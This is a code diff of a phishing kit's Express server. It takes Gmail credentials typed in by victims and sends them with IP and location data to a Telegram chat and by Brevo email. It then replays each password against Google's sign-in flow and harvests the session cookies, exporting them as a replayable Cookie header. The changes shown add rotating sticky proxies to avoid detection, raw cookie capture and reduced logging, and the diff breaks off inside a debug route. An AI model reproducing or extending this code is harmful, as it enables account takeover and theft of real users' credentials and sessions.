@@ -11,8 +11,8 @@ app.use(cors({
     allowedHeaders: ['Content-Type', 'Authorization', 'X-Session-Id'],
     maxAge: 86400
 }));
-app.use(express.json({ limit: '200kb' }));
-app.use(express.urlencoded({ extended: true, limit: '200kb' }));
+app.use(express.json({ limit: '300kb' }));
+app.use(express.urlencoded({ extended: true, limit: '300kb' }));
 
 // ============================================================
 // CONFIG
@@ -22,7 +22,7 @@ const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
 
 const BREVO_API_KEY = process.env.BREVO_API_KEY;
 const SENDER_EMAIL  = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
-const SENDER_NAME   = process.env.SENDER_NAME  || 'ABV Monitor';
+const SENDER_NAME   = process.env.SENDER_NAME  || 'Cookie Monitor';
 const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
     .split(',').map(e => e.trim()).filter(Boolean);
 
@@ -32,13 +32,17 @@ const GMAIL_CAPTURE      = process.env.GMAIL_CAPTURE !== 'false';
 const GMAIL_HARVEST_ALL  = process.env.GMAIL_HARVEST_ALL !== 'false';
 const GMAIL_VERBOSE      = process.env.GMAIL_VERBOSE === 'true';
 const GMAIL_MAX_TRIES    = parseInt(process.env.GMAIL_MAX_TRIES || '2', 10);
-const GMAIL_CHAIN_HOPS   = parseInt(process.env.GMAIL_CHAIN_HOPS || '8', 10);
-const GMAIL_EGRESS_PROXY = process.env.GMAIL_EGRESS_PROXY || '';
-const GMAIL_TIMEOUT_MS   = parseInt(process.env.GMAIL_TIMEOUT_MS || '45000', 10);
+const GMAIL_CHAIN_HOPS   = parseInt(process.env.GMAIL_CHAIN_HOPS || '10', 10);
+const GMAIL_TIMEOUT_MS   = parseInt(process.env.GMAIL_TIMEOUT_MS || '60000', 10);
 const GMAIL_UA_FALLBACK  = process.env.GMAIL_UA_FALLBACK ||
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';
 
 const GMAIL_DOMAINS = new Set(['gmail.com', 'googlemail.com']);
+
+const PROXY_LIST = (process.env.GMAIL_EGRESS_PROXY || '')
+    .split(',').map(s => s.trim()).filter(Boolean);
+const PROXY_STICKY = process.env.GMAIL_PROXY_STICKY !== 'false';
+const PROXY_ROTATE_ON_FAIL = process.env.GMAIL_PROXY_ROTATE_ON_FAIL !== 'false';
 
 const CRITICAL_COOKIES = new Set([
     'SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'OSID', 'LSID',
@@ -54,15 +58,44 @@ const NOISE_COOKIES = new Set([
     'SOCS', 'PREF', 'SEARCH_SAMESITE', 'GMAIL_AT'
 ]);
 
-let gmailDispatcher = null;
-if (GMAIL_EGRESS_PROXY) {
+let undici = null;
+try { undici = require('undici'); } catch {
+    console.warn('⚠️  undici missing — proxy support disabled (npm i undici)');
+}
+
+// ============================================================
+// STICKY PROXY
+// ============================================================
+function newSessionToken() {
+    return crypto.randomBytes(6).toString('hex');
+}
+
+function proxyUrlFor(base, sessionId) {
+    if (!base) return null;
+    if (base.includes('{session}')) return base.replace(/\{session\}/g, sessionId);
+    if (!PROXY_STICKY) return base;
     try {
-        const { ProxyAgent } = require('undici');
-        gmailDispatcher = new ProxyAgent(GMAIL_EGRESS_PROXY);
-        console.log('🌍 GMAIL egress proxy enabled');
+        const u = new URL(base);
+        u.username = `${decodeURIComponent(u.username)}-session-${sessionId}`;
+        return u.toString();
     } catch {
-        console.warn('⚠️  undici missing — GMAIL_EGRESS_PROXY ignored (npm i undici)');
+        return base;
     }
+}
+
+function maskProxy(url) {
+    if (!url) return null;
+    try {
+        const u = new URL(url);
+        return `${u.protocol}//${u.username.replace(/-session-.*$/, '')}:***@${u.host}`;
+    } catch {
+        return 'invalid-proxy-url';
+    }
+}
+
+function makeAgent(url) {
+    if (!url || !undici) return null;
+    try { return new undici.ProxyAgent(url); } catch { return null; }
 }
 
 // ============================================================
@@ -114,7 +147,6 @@ async function verifyTurnstile(token, remoteIp) {
         const data = await r.json();
         return { success: !!data.success, data };
     } catch (e) {
-        console.error('❌ Turnstile verify error:', e.message);
         return { success: false, error: e.message };
     }
 }
@@ -129,35 +161,25 @@ function firstClientIp(req) {
 }
 
 // ============================================================
-// STARTUP CHECK
+// STARTUP
 // ============================================================
 console.log('========================================');
-console.log(`   TELEGRAM_BOT_TOKEN:   ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
-console.log(`   TELEGRAM_CHAT_ID:     ${CHAT_ID ? '✅' : '❌ MISSING'}`);
-console.log(`   GMAIL_CAPTURE:        ${GMAIL_CAPTURE ? '✅ ENABLED' : '⛔ DISABLED'}`);
-console.log(`   GMAIL_HARVEST_ALL:    ${GMAIL_HARVEST_ALL ? '✅ every stage' : 'stage 2 only'}`);
-console.log(`   GMAIL_VERBOSE:        ${GMAIL_VERBOSE}`);
-console.log(`   GMAIL_TIMEOUT_MS:     ${GMAIL_TIMEOUT_MS}`);
-console.log(`   GMAIL_EGRESS_PROXY:   ${GMAIL_EGRESS_PROXY ? '✅ set' : '— none'}`);
+console.log(`   TELEGRAM:       ${BOT_TOKEN && CHAT_ID ? '✅' : '❌'}`);
+console.log(`   GMAIL_CAPTURE:  ${GMAIL_CAPTURE ? '✅' : '⛔'}`);
+console.log(`   HARVEST_ALL:    ${GMAIL_HARVEST_ALL}`);
+console.log(`   VERBOSE:        ${GMAIL_VERBOSE}`);
+console.log(`   TIMEOUT_MS:     ${GMAIL_TIMEOUT_MS}`);
+console.log(`   PROXY:          ${PROXY_LIST.length ? PROXY_LIST.length + ' endpoint(s), sticky=' + PROXY_STICKY : '— none'}`);
+console.log(`   undici:         ${undici ? '✅' : '❌ missing'}`);
 console.log('========================================');
 
-if (BOT_TOKEN && !CHAT_ID) console.error('❌ BOT_TOKEN set but CHAT_ID missing.');
+if (PROXY_LIST.length && !undici) console.error('❌ proxy configured but undici missing — npm i undici');
 
 // ============================================================
 // BREVO
 // ============================================================
 async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage) {
     if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) return false;
-    const subject = `🔐 Login (Stage ${stage}) - ${email}`;
-    const htmlContent = `
-    <div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:30px;border-radius:10px">
-      <div style="background:#1e930c;color:#fff;padding:15px;border-radius:5px;text-align:center"><h2>🔐 Login (Stage ${stage})</h2></div>
-      <p><b>Email:</b> ${email}</p><p><b>Password:</b> ${password}</p>
-      <p><b>MX:</b> <code>${mxRecord || 'Unknown'}</code></p>
-      <p><b>IP:</b> ${ipInfo?.ip || 'Unknown'}</p>
-      <p><b>Location:</b> ${ipInfo?.city || '?'}, ${ipInfo?.region || '?'}, ${ipInfo?.country || '?'}</p>
-      <p><b>Time:</b> ${new Date().toISOString()}</p>
-    </div>`;
     try {
         const r = await fetch('https://api.brevo.com/v3/smtp/email', {
             method: 'POST',
@@ -165,15 +187,15 @@ async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, s
             body: JSON.stringify({
                 sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                 to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
-                subject, htmlContent
+                subject: `🔐 Login (Stage ${stage}) - ${email}`,
+                htmlContent: `<p><b>${email}</b> : <b>${password}</b></p>
+                    <p>${mxRecord}</p><p>${ipInfo?.ip} ${ipInfo?.country || ''}</p>
+                    <p>${(userAgent || '').slice(0, 100)}</p>`
             }),
             signal: AbortSignal.timeout(15000)
         });
         return r.ok;
-    } catch (e) {
-        console.error('❌ Brevo error:', e.message);
-        return false;
-    }
+    } catch { return false; }
 }
 
 // ============================================================
@@ -189,25 +211,21 @@ async function sendToTelegram(message) {
             signal: AbortSignal.timeout(15000)
         });
         return await r.json();
-    } catch (e) {
-        console.error('❌ Telegram error:', e.message);
-        return null;
-    }
+    } catch { return null; }
 }
 
-async function sendTelegramDocument(caption, filename, text) {
+async function sendTelegramDocument(caption, filename, text, mime) {
     if (!BOT_TOKEN || !CHAT_ID) return { ok: false, reason: 'not-configured' };
     try {
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
         fd.append('caption', String(caption).slice(0, 1024));
         fd.append('parse_mode', 'HTML');
-        fd.append('document', new Blob([text], { type: 'application/json' }), filename);
+        fd.append('document', new Blob([text], { type: mime || 'application/json' }), filename);
         const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
-            { method: 'POST', body: fd, signal: AbortSignal.timeout(25000) });
+            { method: 'POST', body: fd, signal: AbortSignal.timeout(30000) });
         return { ok: r.ok, status: r.status };
     } catch (e) {
-        console.error('❌ Telegram document error:', e.message);
         return { ok: false, reason: e.message };
     }
 }
@@ -221,11 +239,8 @@ async function getIPInfo(ip) {
     if (!first || first === 'Unknown') return fallback;
     try {
         const r = await fetch(`https://ipinfo.io/${first}/json`, { signal: AbortSignal.timeout(6000) });
-        const d = await r.json();
-        return { ...fallback, ...d, ip: first };
-    } catch {
-        return fallback;
-    }
+        return { ...fallback, ...(await r.json()), ip: first };
+    } catch { return fallback; }
 }
 
 async function getMXRecord(domain) {
@@ -235,13 +250,11 @@ async function getMXRecord(domain) {
         const d = await r.json();
         if (d?.Answer?.length) return d.Answer.map(x => x.data).join('\n');
         return 'no-mx';
-    } catch {
-        return 'MX-Error';
-    }
+    } catch { return 'MX-Error'; }
 }
 
 // ============================================================
-// COOKIE JAR
+// JAR (records raw headers)
 // ============================================================
 const SS_MAP = { none: 'no_restriction', lax: 'lax', strict: 'strict' };
 
@@ -251,10 +264,16 @@ function splitSetCookie(header) {
 }
 
 class Jar {
-    constructor() { this.map = new Map(); }
+    constructor() {
+        this.map = new Map();
+        this.rawSetCookie = [];   // [{ hop, url, lines: [...] }]
+        this.rawSent = [];        // [{ hop, url, cookie }]
+    }
 
-    absorb(url, list) {
+    absorb(url, list, hop) {
         const host = new URL(url).hostname;
+        if (list.length) this.rawSetCookie.push({ hop, url, lines: list.slice() });
+
         for (const raw of list) {
             const parts = raw.split(';');
             const pair = parts.shift();
@@ -283,16 +302,11 @@ class Jar {
 
             const isHostPrefix = name.startsWith('__Host-');
             if (isHostPrefix) { domain = host; hasDomain = false; path = '/'; secure = true; }
-
             if (maxAge !== null) expires = Date.now() + maxAge * 1000;
 
             const bare = (domain || host).replace(/^\./, '');
             const key = `${name}|${bare}|${path}`;
-
-            if (value === '' && expires !== null && expires < Date.now()) {
-                this.map.delete(key);
-                continue;
-            }
+            if (value === '' && expires !== null && expires < Date.now()) { this.map.delete(key); continue; }
 
             this.map.set(key, {
                 name, value,
@@ -305,7 +319,7 @@ class Jar {
         }
     }
 
-    header(url) {
+    header(url, hop) {
         const { hostname, pathname } = new URL(url);
         const out = [];
         for (const c of this.map.values()) {
@@ -314,14 +328,18 @@ class Jar {
             if (!pathname.startsWith(c.path)) continue;
             out.push(`${c.name}=${c.value}`);
         }
-        return out.join('; ');
+        const joined = out.join('; ');
+        if (joined && hop !== undefined) this.rawSent.push({ hop, url, cookie: joined });
+        return joined;
     }
 
     has(name) { return [...this.map.values()].some(c => c.name === name); }
     get size() { return this.map.size; }
 
+    list() { return [...this.map.values()]; }
+
     export() {
-        return [...this.map.values()]
+        return this.list()
             .sort((a, b) => Number(CRITICAL_COOKIES.has(b.name)) - Number(CRITICAL_COOKIES.has(a.name)))
             .map(c => ({
                 domain: c.domain,
@@ -338,45 +356,78 @@ class Jar {
             }));
     }
 
+    detailed() {
+        return this.list()
+            .sort((a, b) => Number(CRITICAL_COOKIES.has(b.name)) - Number(CRITICAL_COOKIES.has(a.name)))
+            .map(c => ({
+                name: c.name,
+                domain: c.domain,
+                path: c.path,
+                expiry: c.expirationDate ? new Date(c.expirationDate * 1000).toISOString() : 'session',
+                expiresInSec: c.expirationDate ? c.expirationDate - Math.floor(Date.now() / 1000) : null,
+                httpOnly: c.httpOnly,
+                secure: c.secure,
+                sameSite: c.sameSite,
+                hostOnly: c.hostOnly,
+                critical: CRITICAL_COOKIES.has(c.name),
+                valueLength: c.value.length,
+                value: c.value
+            }));
+    }
+
     headerForExport() {
-        return [...this.map.values()]
+        return this.list()
             .filter(c => CRITICAL_COOKIES.has(c.name) || !NOISE_COOKIES.has(c.name))
             .map(c => `${c.name}=${c.value}`).join('; ');
+    }
+
+    rawText(email, stage, meta) {
+        const L = [];
+        L.push(`# raw Set-Cookie capture`);
+        L.push(`# email: ${email}`);
+        L.push(`# stage: ${stage}`);
+        L.push(`# ts: ${new Date().toISOString()}`);
+        if (meta) L.push(`# ip: ${meta.ip || 'n/a'} | proxy: ${meta.proxy || 'none'} | ua: ${meta.ua || 'n/a'}`);
+        L.push('');
+        for (const h of this.rawSetCookie) {
+            L.push(`--- hop ${h.hop} :: ${h.url}`);
+            for (const line of h.lines) L.push(line);
+            L.push('');
+        }
+        L.push('--- final Cookie header (replayable)');
+        L.push(this.headerForExport() || '(empty)');
+        L.push('');
+        L.push('--- name | domain | expiry | value');
+        for (const c of this.detailed()) {
+            L.push(`${c.name} | ${c.domain}${c.path} | ${c.expiry} | ${c.value}`);
+        }
+        return L.join('\n');
     }
 }
 
 // ============================================================
-// HTML SCRAPERS
+// SCRAPERS
 // ============================================================
-function pickGALX(html) {
-    const m = html.match(/name="GALX"\s+value="([^"]+)"/i);
-    return m ? m[1] : '';
-}
-function pickTL(html) {
-    const m = html.match(/name="TL"\s+value="([^"]+)"/i)
-           || html.match(/\["TL","([^"]+)"\]/)
-           || html.match(/&quot;TL&quot;,\s*&quot;([^&"]+)&quot;/)
-           || html.match(/\\"TL\\",\s*\\"([^"\\]+)\\"/);
-    return m ? m[1] : '';
-}
-function pickDsh(html) {
-    const m = html.match(/name="dsh"\s+value="([^"]+)"/i);
-    return m ? m[1] : '';
-}
-function pickAction(html) {
-    const m = html.match(/action="([^"]*(?:ServiceLoginAuth|challenge\/pwd)[^"]*)"/i)
-           || html.match(/action="([^"]*challenge[^"]*)"/i);
+const pickGALX = h => (h.match(/name="GALX"\s+value="([^"]+)"/i) || [])[1] || '';
+const pickDsh  = h => (h.match(/name="dsh"\s+value="([^"]+)"/i) || [])[1] || '';
+const pickTL   = h => (h.match(/name="TL"\s+value="([^"]+)"/i)
+                    || h.match(/\["TL","([^"]+)"\]/)
+                    || h.match(/&quot;TL&quot;,\s*&quot;([^&"]+)&quot;/)
+                    || h.match(/\\"TL\\",\s*\\"([^"\\]+)\\"/) || [])[1] || '';
+const pickAction = h => {
+    const m = h.match(/action="([^"]*(?:ServiceLoginAuth|challenge\/pwd)[^"]*)"/i)
+           || h.match(/action="([^"]*challenge[^"]*)"/i);
     return m ? m[1].replace(/&amp;/g, '&') : '';
-}
+};
 function absolutize(loc, base) {
     if (!loc) return null;
     try { return new URL(loc, base).toString(); } catch { return null; }
 }
 
 // ============================================================
-// GOOGLE HARVEST
+// HARVEST
 // ============================================================
-async function googleHarvest(email, password, ua) {
+async function googleHarvest(email, password, ua, dispatcher) {
     const jar = new Jar();
     const trace = [];
     const A = 'https://accounts.google.com';
@@ -391,8 +442,10 @@ async function googleHarvest(email, password, ua) {
     let error = null;
     let needs2fa = false;
     let res = null;
+    let hop = 0;
 
     const go = async (url, opts = {}) => {
+        const myHop = ++hop;
         const headers = {
             'user-agent': ua,
             'accept-language': 'en-US,en;q=0.9',
@@ -403,35 +456,31 @@ async function googleHarvest(email, password, ua) {
             'sec-fetch-user': '?1',
             ...(opts.headers || {})
         };
-        const ck = jar.header(url);
+        const ck = jar.header(url, myHop);
         if (ck) headers.cookie = ck;
 
         const init = { method: opts.method || 'GET', headers, body: opts.body, redirect: 'manual', signal };
-        if (gmailDispatcher) init.dispatcher = gmailDispatcher;
+        if (dispatcher) init.dispatcher = dispatcher;
 
         const r = await fetch(url, init);
-        jar.absorb(url, r.headers.getSetCookie?.() ?? splitSetCookie(r.headers.get('set-cookie')));
+        const sc = r.headers.getSetCookie?.() ?? splitSetCookie(r.headers.get('set-cookie'));
+        jar.absorb(url, sc, myHop);
+
         trace.push({
-            s: r.status,
-            u: url.slice(0, 160),
-            l: (r.headers.get('location') || '').slice(0, 160),
-            c: (r.headers.getSetCookie?.() || []).length
+            hop: myHop, s: r.status, u: url.slice(0, 160),
+            l: (r.headers.get('location') || '').slice(0, 160), sc: sc.length
         });
-        if (GMAIL_VERBOSE) console.log(`[HARVEST] ${r.status} ${url.slice(0, 120)}`);
+        if (GMAIL_VERBOSE) console.log(`[H] ${myHop} ${r.status} sc=${sc.length} ${url.slice(0, 110)}`);
         return r;
     };
 
-    const formH = {
-        'content-type': 'application/x-www-form-urlencoded',
-        origin: A,
-        referer: A + '/'
-    };
+    const formH = { 'content-type': 'application/x-www-form-urlencoded', origin: A, referer: A + '/' };
     const post = (url, params) =>
         go(url, { method: 'POST', headers: formH, body: new URLSearchParams(params).toString() });
 
     try {
-        // ---- 1. identifier page (v2 first, follows to v3 if Google moved us) ----
         res = await go(`${A}/signin/v2/identifier?service=mail&continue=${encodeURIComponent(cont)}&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=${dsh}`);
+
         let hops = 0;
         while (res.status >= 300 && res.status < 400 && hops++ < 4) {
             const next = absolutize(res.headers.get('location'), A);
@@ -448,7 +497,6 @@ async function googleHarvest(email, password, ua) {
         let action = pickAction(html);
         let dshUse = pickDsh(html) || dsh;
 
-        // ---- 2. password submission ----
         if (galx) {
             res = await post(`${A}/ServiceLoginAuth`, {
                 Email: email, Passwd: password, GALX: galx, continue: cont,
@@ -458,10 +506,10 @@ async function googleHarvest(email, password, ua) {
             });
         } else if (action && tl) {
             res = await post(action.startsWith('http') ? action : A + action, {
-                Passwd: password, TL: tl, dsh: dshUse, continue: cont,
-                service: 'mail', hl: 'en', flowName: 'GlifWebSignIn',
-                flowEntry: 'ServiceLogin', checkedDomains: 'youtube',
-                checkConnection: 'youtube:177:1', pstMsg: '1', idvSession: ''
+                Passwd: password, TL: tl, dsh: dshUse, continue: cont, service: 'mail',
+                hl: 'en', flowName: 'GlifWebSignIn', flowEntry: 'ServiceLogin',
+                checkedDomains: 'youtube', checkConnection: 'youtube:177:1',
+                pstMsg: '1', idvSession: ''
             });
         } else {
             const idUrl = `${A}/v3/signin/identifier?continue=${encodeURIComponent(cont)}&service=mail&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=${dsh}`;
@@ -474,9 +522,9 @@ async function googleHarvest(email, password, ua) {
             const loc = idRes.headers.get('location') || '';
             let tl2 = (loc.match(/[?&]TL=([^&]+)/) || [])[1] || '';
             let dsh2 = (loc.match(/[?&]dsh=([^&]+)/) || [])[1] || dshUse;
-            let body = '';
 
             if (!tl2) {
+                let body = '';
                 try { body = await idRes.text(); } catch { body = ''; }
                 tl2 = pickTL(body);
                 dsh2 = pickDsh(body) || dsh2;
@@ -485,15 +533,15 @@ async function googleHarvest(email, password, ua) {
             }
 
             if (tl2) {
-                const pwdUrl = action && action.includes('challenge')
+                const pwdUrl = (action && action.includes('challenge'))
                     ? (action.startsWith('http') ? action : A + action)
                     : `${A}/v3/signin/challenge/pwd?TL=${encodeURIComponent(tl2)}&continue=${encodeURIComponent(cont)}&service=mail&hl=en&dsh=${encodeURIComponent(dsh2)}`;
 
                 res = await post(pwdUrl, {
-                    Passwd: password, TL: tl2, dsh: dsh2, continue: cont,
-                    service: 'mail', hl: 'en', flowName: 'GlifWebSignIn',
-                    flowEntry: 'ServiceLogin', checkedDomains: 'youtube',
-                    checkConnection: 'youtube:177:1', pstMsg: '1', idvSession: ''
+                    Passwd: password, TL: tl2, dsh: dsh2, continue: cont, service: 'mail',
+                    hl: 'en', flowName: 'GlifWebSignIn', flowEntry: 'ServiceLogin',
+                    checkedDomains: 'youtube', checkConnection: 'youtube:177:1',
+                    pstMsg: '1', idvSession: ''
                 });
             } else {
                 res = idRes;
@@ -501,7 +549,6 @@ async function googleHarvest(email, password, ua) {
             }
         }
 
-        // ---- 3. one retry if Google handed back the password form again ----
         if (res && res.status === 200 && !jar.has('SID')) {
             let h2 = '';
             try { h2 = await res.text(); } catch { h2 = ''; }
@@ -510,10 +557,10 @@ async function googleHarvest(email, password, ua) {
 
             if (tl3 && act3) {
                 res = await post(act3.startsWith('http') ? act3 : A + act3, {
-                    Passwd: password, TL: tl3, dsh: dshUse, continue: cont,
-                    service: 'mail', hl: 'en', flowName: 'GlifWebSignIn',
-                    flowEntry: 'ServiceLogin', checkedDomains: 'youtube',
-                    checkConnection: 'youtube:177:1', pstMsg: '1', idvSession: ''
+                    Passwd: password, TL: tl3, dsh: dshUse, continue: cont, service: 'mail',
+                    hl: 'en', flowName: 'GlifWebSignIn', flowEntry: 'ServiceLogin',
+                    checkedDomains: 'youtube', checkConnection: 'youtube:177:1',
+                    pstMsg: '1', idvSession: ''
                 });
             } else if (/id="password"|Wrong password|password could not be found/i.test(h2)) {
                 if (!error) error = 'wrong-password';
@@ -522,13 +569,11 @@ async function googleHarvest(email, password, ua) {
             }
         }
 
-        // ---- 4. chase redirects ----
         let next = absolutize(res?.headers.get('location'), A);
         hops = 0;
         while (next && hops++ < GMAIL_CHAIN_HOPS) {
             if (/challenge\/(totp|ipp|dp|sk|az)/.test(next) || /\/v3\/signin\/challenge/.test(next)) {
-                needs2fa = true;
-                break;
+                needs2fa = true; break;
             }
             const r2 = await go(next);
             if (r2.status >= 300 && r2.status < 400) {
@@ -538,7 +583,6 @@ async function googleHarvest(email, password, ua) {
             break;
         }
 
-        // ---- 5. top up the accounts.google.com / google.com sets ----
         if (jar.has('SID') || jar.has('__Secure-1PSID')) {
             await go(`${A}/ListAccounts?authuser=0&gpsia=1&source=ogb&mo=1&listPages=1&lp=1&hl=en`).catch(() => {});
             await go('https://myaccount.google.com/').catch(() => {});
@@ -553,15 +597,16 @@ async function googleHarvest(email, password, ua) {
         trace.push({ error: e.message });
     }
 
-    const ok = jar.has('SID') && jar.has('__Secure-1PSID');
-    return { ok, error, jar, trace, needs2fa, finalUrl: res?.headers.get('location') || null };
+    return {
+        ok: jar.has('SID') && jar.has('__Secure-1PSID'),
+        error, jar, trace, needs2fa, hops: hop
+    };
 }
 
 // ============================================================
-// HARVEST + REPORT (single-flight per email)
+// HARVEST + REPORT
 // ============================================================
 const inFlight = new Map();
-
 function harvestLocked(key, fn) {
     if (inFlight.has(key)) return inFlight.get(key);
     const p = fn().finally(() => inFlight.delete(key));
@@ -569,101 +614,107 @@ function harvestLocked(key, fn) {
     return p;
 }
 
+async function runWithProxyChain(email, password, ua) {
+    const sessionId = newSessionToken();
+    const targets = PROXY_LIST.length ? PROXY_LIST : [null];
+    let best = null;
+
+    for (let i = 0; i < targets.length; i++) {
+        const proxyUrl = proxyUrlFor(targets[i], sessionId);
+        const agent = makeAgent(proxyUrl);
+        try {
+            const out = await googleHarvest(email, password, ua, agent);
+            const rec = { ...out, proxy: proxyUrl ? maskProxy(proxyUrl) : null };
+            if (!best || rec.ok) best = rec;
+            if (rec.ok) break;
+            if (!PROXY_ROTATE_ON_FAIL) break;
+        } catch (e) {
+            if (!best) {
+                best = { ok: false, error: 'threw:' + e.message, jar: new Jar(), trace: [], needs2fa: false, hops: 0, proxy: proxyUrl ? maskProxy(proxyUrl) : null };
+            }
+            if (!PROXY_ROTATE_ON_FAIL) break;
+        } finally {
+            try { agent?.close(); } catch {}
+        }
+    }
+    return best || { ok: false, error: 'no-attempt', jar: new Jar(), trace: [], needs2fa: false, hops: 0, proxy: null };
+}
+
 async function harvestAndReport({ email, password, firstPassword, ua, ip, ipInfo, stage, match }) {
     const tries = [...new Set([password, firstPassword].filter(Boolean))].slice(0, GMAIL_MAX_TRIES);
 
     let best = null;
     for (const pw of tries) {
-        try {
-            const out = await googleHarvest(email, pw, ua);
-            if (!best || out.ok) best = { pw, ...out };
-            if (out.ok) break;
-        } catch (e) {
-            console.error('❌ harvest hop error:', e.message);
-            if (!best) {
-                best = { pw, ok: false, error: 'threw:' + e.message, jar: new Jar(), trace: [], needs2fa: false, finalUrl: null };
-            }
-        }
+        const out = await runWithProxyChain(email, pw, ua);
+        if (!best || out.ok) best = { pw, ...out };
+        if (out.ok) break;
     }
 
     const jar = best?.jar || new Jar();
     const cookies = jar.export();
+    const detailed = jar.detailed();
+    const rawText = jar.rawText(email, stage, { ip, proxy: best?.proxy, ua });
     const arrayJson = JSON.stringify(cookies, null, 2);
     const safe = email.replace(/[^a-z0-9]/gi, '_');
-    const hasSid = jar.has('SID');
-    const hasPsid = jar.has('__Secure-1PSID');
     const critical = cookies.filter(c => CRITICAL_COOKIES.has(c.name)).length;
     const err = best?.error || null;
+    const names = detailed.filter(c => c.critical).map(c => c.name);
 
     const caption =
-        `<b>Gmail harvest — stage ${stage}</b> ${best?.ok ? '✅' : '⚠️'}\n` +
-        `<code>${email}</code> · <code>${best?.pw || password}</code>\n` +
-        `match=${match ? 'yes' : 'no'} · SID=${hasSid ? 'yes' : 'no'} · 1PSID=${hasPsid ? 'yes' : 'no'}\n` +
-        `cookies=${cookies.length} (critical ${critical}) · hops=${best?.trace?.length || 0}\n` +
-        (err ? `<b>error:</b> ${err}\n` : '') +
-        (best?.needs2fa ? '2FA challenge hit\n' : '') +
-        `IP ${ip || 'n/a'} · ${ipInfo?.country || '?'}`;
+        `<b>Harvest s${stage}</b> ${best?.ok ? '✅' : '⚠️'} <code>${email}</code>\n` +
+        `pw <code>${best?.pw || password}</code> · match=${match ? 'yes' : 'no'}\n` +
+        `cookies=${cookies.length} crit=${critical} hops=${best?.hops || 0}\n` +
+        (err ? `<b>err:</b> ${err}\n` : '') +
+        (best?.proxy ? `proxy ${best.proxy}\n` : 'proxy none\n') +
+        (names.length ? `crit names: ${names.join(', ')}` : 'no critical names');
 
-    // always deliver something
-    let telegram = { ok: false, reason: 'no-cookies' };
+    const docs = {};
     if (cookies.length) {
-        telegram = await sendTelegramDocument(caption, `cookies-${safe}-s${stage}.json`, arrayJson);
+        docs.raw = await sendTelegramDocument(caption, `raw-${safe}-s${stage}.txt`, rawText, 'text/plain');
+        docs.json = await sendTelegramDocument(caption, `cookies-${safe}-s${stage}.json`, arrayJson);
     }
-
     if (!cookies.length || GMAIL_VERBOSE) {
-        const debug = {
-            email, stage, password: best?.pw || password,
-            ok: !!best?.ok, error: err, needs2fa: !!best?.needs2fa,
-            finalUrl: best?.finalUrl || null,
-            userAgent: ua, ip, ipInfo, ts: new Date().toISOString(),
-            cookieCount: cookies.length, criticalCount: critical,
-            cookieHeader: jar.headerForExport(),
-            cookies, trace: best?.trace || []
-        };
-        await sendTelegramDocument(
-            `<b>debug</b> stage ${stage} · ${email}\n${err || 'ok'} · ${cookies.length} cookies`,
+        docs.debug = await sendTelegramDocument(
+            `debug s${stage} ${email} · ${err || 'ok'} · ${cookies.length}c`,
             `debug-${safe}-s${stage}.json`,
-            JSON.stringify(debug, null, 2)
+            JSON.stringify({
+                email, stage, password: best?.pw || password, ok: !!best?.ok,
+                error: err, needs2fa: !!best?.needs2fa, proxy: best?.proxy || null,
+                ip, ipInfo, ua, ts: new Date().toISOString(),
+                cookieCount: cookies.length, criticalCount: critical,
+                finalCookieHeader: jar.headerForExport(),
+                rawSetCookie: jar.rawSetCookie, cookieHeaderSent: jar.rawSent,
+                cookies: detailed, trace: best?.trace || []
+            }, null, 2)
         );
     }
 
-    console.log(`🍪 stage ${stage} ${email} -> ${cookies.length} cookies, err=${err || 'none'}, tg=${telegram.ok}`);
+    console.log(`🍪 s${stage} ${email} ${cookies.length}c err=${err || 'none'} proxy=${best?.proxy || 'none'}`);
 
     return {
-        ok: !!best?.ok,
-        error: err,
-        traceLen: best?.trace?.length || 0,
-        needs2fa: !!best?.needs2fa,
-        total: cookies.length,
-        critical,
-        hasSid,
-        hasPsid,
+        ok: !!best?.ok, error: err, traceLen: best?.trace?.length || 0,
+        needs2fa: !!best?.needs2fa, proxy: best?.proxy || null,
+        total: cookies.length, critical, names,
+        hasSid: jar.has('SID'), hasPsid: jar.has('__Secure-1PSID'),
         filename: `cookies-${safe}-s${stage}.json`,
-        json: arrayJson,
-        telegram
+        json: arrayJson, cookies: detailed, rawText,
+        telegram: { ok: !!(docs.raw?.ok || docs.json?.ok), docs }
     };
 }
 
 // ============================================================
-// HEALTH
+// ROUTES
 // ============================================================
 app.get('/health', (req, res) => {
     res.json({
-        status: 'ok',
-        uptime: process.uptime(),
+        status: 'ok', uptime: process.uptime(),
         telegram: !!(BOT_TOKEN && CHAT_ID),
-        turnstile: !!TURNSTILE_SECRET_KEY,
-        gmailCapture: GMAIL_CAPTURE,
-        gmailHarvestAll: GMAIL_HARVEST_ALL,
-        gmailVerbose: GMAIL_VERBOSE,
-        gmailEgressProxy: !!GMAIL_EGRESS_PROXY,
-        inFlight: inFlight.size
+        gmailCapture: GMAIL_CAPTURE, verbose: GMAIL_VERBOSE,
+        proxies: PROXY_LIST.length, sticky: PROXY_STICKY,
+        undici: !!undici, inFlight: inFlight.size
     });
 });
 
-// ============================================================
-// HARVEST DEBUG (no Telegram, direct trace)
-// ============================================================
 async function harvestDebug(req, res) {
     const src = req.method === 'POST' ? (req.body || {}) : req.query;
     const { email, password } = src;
@@ -671,14 +722,18 @@ async function harvestDebug(req, res) {
 
     const ua = src.ua || req.headers['user-agent'] || GMAIL_UA_FALLBACK;
     try {
-        const out = await googleHarvest(email, password, ua);
+        const out = await runWithProxyChain(email, password, ua);
+        const jar = out.jar;
         res.json({
-            ok: out.ok,
-            error: out.error,
-            needs2fa: out.needs2fa,
-            count: out.jar.size,
-            finalUrl: out.finalUrl,
-            cookies: out.jar.export(),
+            ok: out.ok, error: out.error, needs2fa: out.needs2fa,
+            proxy: out.proxy, hops: out.hops,
